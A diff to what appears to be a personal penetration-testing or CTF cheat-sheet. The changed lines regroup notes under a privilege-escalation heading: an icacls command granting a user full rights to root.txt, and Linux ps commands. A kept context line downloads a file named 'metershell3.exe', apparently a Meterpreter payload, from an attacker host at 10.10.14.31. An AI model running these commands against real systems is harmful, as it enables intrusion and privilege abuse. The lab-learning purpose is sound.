@@ -612,7 +612,18 @@ f.) Some other Powershell commands:
 Download a file:
 powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.31:8000/metershell3.exe', 'metershell3.exe')"
 
-g.) Grant yourself permission in windows:
-where alfred is the user
-icacls root.txt /grant alfred:F
+=====================================================================
+6.) Priv Escalation
+
+1.) Windows 
+	a.)Grant yourself permission in windows:
+	where alfred is the user
+	icacls root.txt /grant alfred:F
+
+2.) in Linux
+List running process of a user
+ps -u *username*
+List file path of a certain process
+ps -fp $PID_Number
+
 
